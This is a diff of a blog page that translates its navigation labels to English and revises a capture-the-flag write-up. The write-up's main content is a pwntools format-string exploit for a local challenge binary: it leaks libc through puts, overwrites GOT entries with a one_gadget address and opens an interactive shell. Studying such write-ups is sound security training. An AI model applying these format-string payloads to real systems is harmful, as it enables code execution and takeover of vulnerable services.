@@ -56,32 +56,32 @@
             <li>
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
-                    <span>主页</span>
+                    <span>HOME</span>
                 </a>
             </li>
             <li>
                 <a href="/tags">
                     <i class="iconfont icon-biaoqian1"></i>
-                    <span>标签</span>
+                    <span>TAGS</span>
                 </a>
             </li>
             <li>
                 <a href="/archives">
                     <i class="iconfont icon-guidang2"></i>
-                    <span>存档</span>
+                    <span>ARCHIVES</span>
                 </a>
             </li>
             <li>
                 <a href="/about/">
                     <i class="iconfont icon-guanyu2"></i>
-                    <span>关于</span>
+                    <span>ABOUT</span>
                 </a>
             </li>
             
             <li>
                 <a id="search">
                     <i class="iconfont icon-sousuo1"></i>
-                    <span>搜索</span>
+                    <span>SEARCH</span>
                 </a>
             </li>
             
@@ -100,7 +100,7 @@
         <div class="search-input">
             <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
             <input id="search-input">
-            <span id="begin-search">搜索</span>
+            <span id="begin-search">search</span>
         </div>
         <div class="search-result-container" id="search-result-container">
 
@@ -124,16 +124,16 @@
     </div>
 
     <div class="post-meta">
-        <span class="attr">发布于：<span>2019-08-10 19:01:00</span></span>
+        <span class="attr">Post：<span>2019-08-10 19:01:00</span></span>
         
-        <span class="attr">标签：/
+        <span class="attr">Tags：/
         
         <a class="tag" href="/tags/#WP" title="WP">WP</a>
         <span>/</span>
         
         
         </span>
-        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
 </span>
 
     </div>
@@ -148,7 +148,7 @@
 <li>泄露libc基地址</li>
 <li>覆盖rand函数的got地址为<code>one_gg</code>，从而getshell</li>
 </ul>
-<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = process(<span class="string">"./pwn2"</span>)</span><br><span class="line">file = ELF(<span class="string">"./pwn2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">exit_got = file.got[<span class="string">'exit'</span>]</span><br><span class="line">puts_got = file.got[<span class="string">'puts'</span>]</span><br><span class="line">log.info(hex(exit_got))</span><br><span class="line">payload1 =<span class="string">"%4196176c%10$n"</span>+<span class="string">"\x00\x00"</span>+p64(exit_got)</span><br><span class="line">payload2 = <span class="string">"%9$s\x00\x00\x00\x00"</span>+p64(puts_got)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r.recvuntil(<span class="string">"enter:"</span>)</span><br><span class="line">    r.sendline(str(<span class="number">48</span>))</span><br><span class="line">    r.recvuntil(<span class="string">"guess?: "</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># raw_input()</span></span><br><span class="line">    r.sendline(payload1)</span><br><span class="line">    r.recvuntil(<span class="string">"enter:"</span>)</span><br><span class="line">    r.sendline(str(<span class="number">48</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="string">"bye~"</span> <span class="keyword">in</span> r.recv():</span><br><span class="line">        r.sendline(str(<span class="number">48</span>))</span><br><span class="line">    r.sendline(payload2)</span><br><span class="line">    puts_addr = u64(r.recvuntil(<span class="string">"bye~"</span>,drop=<span class="literal">True</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">    log.info(<span class="string">"puts_addr : "</span>+hex(puts_addr))</span><br><span class="line">    base_addr = puts_addr- libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    one_gg = <span class="number">0x45216</span>+base_addr</span><br><span class="line">    log.info(<span class="string">"base_addr:"</span>+hex(base_addr))</span><br><span class="line">    log.info(<span class="string">"one_gg:"</span>+hex(one_gg))</span><br><span class="line">    payload3 = <span class="string">"%"</span>+str(int(one_gg&amp;<span class="number">0xffff</span>))+<span class="string">"c%10$hn"</span></span><br><span class="line">    payload3 += <span class="string">"\x00"</span>*(<span class="number">0x10</span>-len(payload3))+p64(<span class="number">0x601068</span>)</span><br><span class="line">    <span class="keyword">print</span> len(payload3)</span><br><span class="line">    r.recvuntil(<span class="string">"enter:"</span>)    </span><br><span class="line">    r.sendline(payload3)</span><br><span class="line">    r.sendline(str(<span class="number">48</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="string">"bye~"</span> <span class="keyword">in</span> r.recv():</span><br><span class="line">        r.sendline(str(<span class="number">48</span>))</span><br><span class="line">    r.sendline(payload3)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    raw_input()</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	r = process(<span class="string">"./pwn2"</span>)</span><br><span class="line">	file = ELF(<span class="string">"./pwn2"</span>)</span><br><span class="line">	libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">	exit_got = file.got[<span class="string">'exit'</span>]</span><br><span class="line">	puts_got = file.got[<span class="string">'puts'</span>]</span><br><span class="line">	log.info(hex(exit_got))</span><br><span class="line">	payload1 =<span class="string">"%4196176c%10$n"</span>+<span class="string">"\x00\x00"</span>+p64(exit_got)</span><br><span class="line">	payload2 = <span class="string">"%9$s\x00\x00\x00\x00"</span>+p64(puts_got)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">	    r.recvuntil(<span class="string">"enter:"</span>)</span><br><span class="line">	    r.sendline(str(<span class="number">48</span>))</span><br><span class="line">	    r.recvuntil(<span class="string">"guess?: "</span>)</span><br><span class="line">	    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">	    <span class="comment"># raw_input()</span></span><br><span class="line">	    r.sendline(payload1)</span><br><span class="line">	    r.recvuntil(<span class="string">"enter:"</span>)</span><br><span class="line">	    r.sendline(str(<span class="number">48</span>))</span><br><span class="line">	    <span class="keyword">while</span> <span class="string">"bye~"</span> <span class="keyword">in</span> r.recv():</span><br><span class="line">	        r.sendline(str(<span class="number">48</span>))</span><br><span class="line">	    r.sendline(payload2)</span><br><span class="line">	    puts_addr = u64(r.recvuntil(<span class="string">"bye~"</span>,drop=<span class="literal">True</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">	    log.info(<span class="string">"puts_addr : "</span>+hex(puts_addr))</span><br><span class="line">	    base_addr = puts_addr- libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">	    one_gg = <span class="number">0x45216</span>+base_addr</span><br><span class="line">	    log.info(<span class="string">"base_addr:"</span>+hex(base_addr))</span><br><span class="line">	    log.info(<span class="string">"one_gg:"</span>+hex(one_gg))</span><br><span class="line">	    payload3 = <span class="string">"%"</span>+str(int(one_gg&amp;<span class="number">0xffff</span>))+<span class="string">"c%10$hn"</span></span><br><span class="line">	    payload3 += <span class="string">"\x00"</span>*(<span class="number">0x10</span>-len(payload3))+p64(<span class="number">0x601068</span>)</span><br><span class="line">	    <span class="keyword">print</span> len(payload3)</span><br><span class="line">	    r.recvuntil(<span class="string">"enter:"</span>)    </span><br><span class="line">	    r.sendline(payload3)</span><br><span class="line">	    r.sendline(str(<span class="number">48</span>))</span><br><span class="line">	    <span class="keyword">while</span> <span class="string">"bye~"</span> <span class="keyword">in</span> r.recv():</span><br><span class="line">	        r.sendline(str(<span class="number">48</span>))</span><br><span class="line">	    r.sendline(payload3)</span><br><span class="line">	    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">	    raw_input()</span><br><span class="line">	    sleep(<span class="number">0.2</span>)</span><br><span class="line">	    r.interactive()</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">	    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
 <p>因为最后一次发送payload后有点问题，卡了我一个多小时也没调试出来，到最后才发现竟然少了一句<code>raw_input()</code>，心态爆炸，自己太菜了！</p>
 
         
